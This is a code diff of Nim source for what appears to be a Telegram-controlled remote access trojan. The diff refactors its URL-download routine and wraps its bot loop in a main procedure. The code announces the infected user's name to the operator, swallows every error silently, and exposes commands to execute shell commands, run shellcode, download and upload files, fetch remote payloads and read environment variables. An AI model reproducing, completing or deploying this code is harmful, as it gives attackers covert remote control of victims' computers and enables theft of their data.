@@ -32,7 +32,8 @@ proc shellCode(b: Telebot, e: Command) {.async.} =
 proc downloadUrl(b:TeleBot, e: Command) {.async.} =
     let url = e.message.text.get.split(" ", 1)[1]
     let output = "log.txt"
-    downloadFile(url, output)
+    var client = newAsyncHttpClient()
+    await client.downloadFile(url, output)
 
 proc download(b: Telebot, e: Command) {.async.} =
     let file_name = e.message.text.get.split(" ", 1)[1]
@@ -101,16 +102,18 @@ proc get_env(b: Telebot, e: Command) {.async.} =
 #       var message = newMessage(response.chat.id, text)
 #       message.disableNotification = true
 #       discard await b.send(message)
-try: 
-    let bot = newTeleBot(API_KEY)
-    bot.send(newMessage(chat_id, getEnv("username") & " is on"))
-    bot.onCommand("env", get_env)
-    bot.onCommand("exec", execCmd)
-    bot.onCommand("download", download)
-    bot.onCommand("help", help)
-    bot.onCommand("downloadUrl", downloadUrl)
-    bot.onCommand("shellcode", shellCode)
-    bot.onUpdate(uploadHandler)
-    bot.poll(timeout=300)
-except:
-    discard
+proc main =
+  try: 
+      let bot = newTeleBot(API_KEY)
+      bot.send(newMessage(chat_id, getEnv("username") & " is on"))
+      bot.onCommand("env", get_env)
+      bot.onCommand("exec", execCmd)
+      bot.onCommand("download", download)
+      bot.onCommand("help", help)
+      bot.onCommand("downloadUrl", downloadUrl)
+      bot.onCommand("shellcode", shellCode)
+      bot.onUpdate(uploadHandler)
+      bot.poll(timeout=300)
+  except:
+      discard
+main()
